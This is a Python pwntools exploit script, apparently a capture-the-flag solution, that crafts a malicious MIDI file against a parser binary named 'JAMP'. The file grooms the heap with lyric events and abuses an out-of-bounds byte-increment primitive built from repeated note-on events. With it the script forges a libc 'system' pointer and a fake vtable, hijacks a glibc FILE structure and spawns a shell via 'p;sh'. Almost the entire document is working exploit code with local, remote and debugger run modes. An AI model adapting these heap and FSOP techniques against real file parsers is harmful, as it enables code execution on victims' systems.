from pwn import *

exe = './JAMP'

(host,port) = ("nc jamp.eng.run",1337)

context.terminal = ["gnome-terminal", "--"]

# ====================[EXPANSIONS]=========================

se  = lambda data  : p.send(data)
sl  = lambda data  : p.sendline(data)
sa  = lambda ip,op : p.sendafter(ip,op)
sla = lambda ip,op : p.sendlineafter(ip,op) 
rvu = lambda data  : p.recvuntil(data)
rvl = lambda       : p.recvline()
rv  = lambda nbyts : p.recv(nbyts)  
pop = lambda       : p.interactive()

# >>>>>>>>>>>>>>>>[EXPLOIT STARTS HERE]>>>>>>>>>>>>>>>>>>>>


# ========================================================
# MIDI PARSER INFO
# ========================================================

MTYPE_NOTE_OFF           = 0x8
MTYPE_NOTE_ON            = 0x9 
MTYPE_NOTE_AFTERTOUCH    = 0xA 
MTYPE_CONTROLLER         = 0xB 
MTYPE_PROGRAM_CHANGE     = 0xC
MTYPE_CHANNEL_AFTERTOUCH = 0xD 
MTYPE_PITCH_BEND 	     = 0xE

# ========================================================
# META PARSER INFO
# ========================================================

MTA_SEQ_NUM           = 0x00
MTA_TEXT_EVENT        = 0x01  
MTA_COPYRIGHT_NOTICE  = 0x02 
MTA_TRACK_NAME        = 0x03  
MTA_INSTR_NAME        = 0x04 
MTA_LYRICS            = 0x05 
MTA_MARKER            = 0x06 
MTA_CUE_PT            = 0x07
MTA_TRACK_INFO        = 0x08
MTA_MIDI_PREFIX       = 0x20
MTA_END_OF_TRACK      = 0x2f
MTA_SET_TEMPO         = 0x51 
MTA_SMPTE_OFFT        = 0x54
MTA_TIME_SIGN         = 0x58
MTA_KEY_SIGN          = 0x59 
MTA_SEQ_SPECIFIC      = 0x7f

# ========================================================

f = open("./examples/exploit.mid","wb")

def b8(payload):
    return p8(payload)

def b32(payload):
    return p32(payload,endianness="big")

def b16(payload):
    return p16(payload,endianness="big")

def neg(num):
    return (0x100 - num)

def encVarint(num):
    payload = b""
    n1 = ((num) & 0x7f)
    n2 = ((1 << 15) | (((num >> 7) & 0x7f)  << 8)) if ((num >> 7) & 0x7f) != 0x0 else 0
    n3 = ((1 << 23) | (((num >> 14) & 0x7f)<< 16)) if ((num >> 14) & 0x7f) != 0x0 else 0
    n4 = ((1 << 31) | (((num >> 21) & 0x7f)<< 24)) if ((num >> 21) & 0x7f) != 0x0 else 0
    n3 = n3 | n4
    n2 = n2 | n3 | n4
    nm = n1 | n2 | n3 | n4 
    if(n4):
        return b32(nm)
    elif(n3):
        return b8(nm & 0xff0000) + b16(nm & 0xffff)
    elif (n2):
        return b16(num & 0xffff)
    else:
        return b8(nm & 0xff)

def Mheader(leng,fmt,ntracks,div):
    return b"MThd" + b32(leng) + b16(fmt) + b16(ntracks) + b16(div)

def MTrack(leng):
    return b"MTrk" + b32(leng)

def TMIDI(dtime,e_type,p1,p2):
    return encVarint(dtime) + b8(e_type) + b8(p1) + b8(p2)

def TMETA(dtime,e_type,data):
    print(len(data))
    return encVarint(dtime) + b8(0XFF) + b8(e_type) + encVarint(len(data)) + data

def TSYSEX(dtime,e_type,data):
    return encVarint(dtime) + b8(0XF0) + b8(e_type) + encVarint(len(data)) + data

def incbyte(idx,amt):
    return TMIDI(0x0,0x90 | MTYPE_NOTE_ON,idx,0x0)*amt

# TRANSFERS NBYTES TO BUFFER 
def transfer(nbytes,idx):
    pll = b""
    for i in range (nbytes):
        pll += incbyte(idx + i,1)
    return pll

# TRANSFERS A STRING TO BUFFER
def writestr(st):
    pl = b""
    for i in range (len(st)):
        pl += incbyte(ord(st[i]),1)
    return pl

# =========================================================================
#   EXPLOIT 
# =========================================================================

fmt = 0
ntracks = 2
div = 0xdead

# CODE EXEC PATH ====================================================
# [+] GET SYSTEM POINTER FOR VTABLE [DONE]
# [+] EDIT FLAGS TO l;sh;
# [+] LOOP AROUND 
# [+] OVERWRITE WIDE_DATA->VTABLE WITH FAKE VTABLE TO SYSTEM : 0x58
# [+] OVERWRITE 
# [+] GET VTABLE POINTER FOR CHANGING [DONE]
# [+] CHANGE THE OCTAVE_NOTE LOCATION
# [+] OFFSET FILE->VTABLE BY 0x188
# ===================================================================

# FSOP CODE PATH ====================================================
# | 0x7ffff7a9cce8 <__GI__IO_file_close_it+104>    mov    rdi, rbx
# | 0x7ffff7a9cceb <__GI__IO_file_close_it+107>    call   qword ptr [r13 + 0x88]
# | FSOP CODEPATH => _IO_wdoallocbuf+43 
# command run: l;sh
# ===================================================================

# SETTING UP HEAP LAYOUT
fl  = Mheader(0x1000,fmt,ntracks,div)
fl += MTrack(0x1000)
fl += TMETA(0x0,MTA_LYRICS,b"A"*0x20)
fl += TMETA(0x0,MTA_LYRICS,b"A"*0x20)
fl += TMETA(0x0,MTA_LYRICS,b"A"*0x14f0)
fl += TMETA(0x0,MTA_LYRICS,b"A"*0x30)
fl += TMETA(0x0,MTA_LYRICS,b"\x00"*0x30)
fl += TMETA(0x0,MTA_LYRICS,b"A"*0x90)

# ACTUAL OOB PAYLOAD 0x2000 MAX
# + incbyte(neg(0x47),0xd2)

payload = (incbyte(0,0x1) + 
           ( # SETTING A LIBC POINTER TO SYSTEM
           incbyte(neg(0x68),0x50)  + 
           incbyte(neg(0x67),0xd1)  + 
           incbyte(neg(0x66),0xe7)) + 
             # ADJUSTER TO NOT REWRITE EXPLOIT
           incbyte(0x0,0x46)        + 
           ( # SETTING A VTABLE PTR TO COPY
           incbyte(neg(0x6f),0xe5)  + 
           incbyte(neg(0x70),0x4d)) + 
           ( # SETTING UP WIDE_DATA->VTABLE
           incbyte(neg(0x47),0x2)   + 
           incbyte(0,0x5d)          + 
           transfer(1,0x60)         + 
           transfer(7,neg(0x5f)))   + 
           ( # LOOPING AROUND TO GET 2ND WRITE ON FS
           incbyte(neg(0x47),0x20)  + 
           incbyte(0,0x1)           +
           incbyte(neg(0x47),0x8)   + 
           incbyte(0,0x5)           + 
           incbyte(neg(0x47),0xd4)  +
           incbyte(0,0x25)          +
           incbyte(neg(0x47),0x1))  +
           ( # SETTING UP THE l;sh IN FLAGS
           writestr("p;sh"))        +  
           ( # SETTING UP THE FINAL VTABLE POINTER
           incbyte(neg(0x47),0x21)  + 
           incbyte(0,0x1)           +

           incbyte(neg(0x37),0x5)   + 
           incbyte(neg(0x6f),0x1)   +
           incbyte(neg(0x70),0x88)  +
           
           incbyte(0,0x2)           +
           incbyte(neg(0x38),0x20)  +
           incbyte(neg(0x47),0xdd)  +
           incbyte(0,0x1c)          +
           incbyte(0,0x8)           +
           incbyte(neg(0x47),0x1)   +
           transfer(8,0x60)
        )
           )

padd = (TMIDI(0x0,0x90 | MTYPE_NOTE_ON,0x41,0x0)*0x1000)
fl += payload

# THIS IS TO FILL THE MEMORY HOLES WITH POINTERS
fl += TMETA(0x0,MTA_END_OF_TRACK,b8(0x3))
fl += MTrack(0x1000)
fl += TMIDI(0x0,0x90 | MTYPE_NOTE_ON,0,0x0)
fl += TMETA(0x0,MTA_END_OF_TRACK,b8(0x3))
fl += p64(0x0)

# EXPLOIT IS READY :D
f.write(fl)
f.close()

# =========================================================================
#   RUN EXPLOIT 
# =========================================================================

if args.REL:
    context.log_level = "DEBUG"
    p = process(["python3","./runner.py"])
    sla(b"Size : ",str(len(fl)).encode())
    se(fl)
    p.interactive()

elif args.RE:
    context.log_level = "DEBUG"
    p = remote("localhost",1338)
    sla(b"Size : ",str(len(fl)).encode())
    pause()
    se(fl)
    p.interactive()

elif args.GDB:
    os.system('''gnome-terminal -- gdb ./JAMP \
                                    -ex "b * main" \
                                    -ex "r ./examples/exploit.mid" \
                                    -ex "b *_ZN4MIDI8showTrckEv + 146"\
                                    -ex "b * _ZN4MIDI11showMidiTrkEPSt6vectorI10MIDI_EVENTSaIS1_EE+421"\
                                    ''')
else:
    os.system('''./JAMP ./examples/exploit.mid''')


